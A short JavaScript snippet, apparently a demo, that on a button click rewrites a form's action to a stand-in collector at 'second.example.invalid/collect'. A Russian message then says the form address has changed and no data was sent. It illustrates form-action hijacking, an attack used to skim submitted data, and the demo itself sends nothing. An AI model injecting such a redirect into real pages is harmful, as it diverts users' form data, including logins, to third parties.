document.getElementById('change').onclick=()=>{
  document.getElementById('demo').setAttribute('action','https://second.example.invalid/collect');
  document.getElementById('result').textContent='Адрес формы изменён. Данные не отправлены.';
};
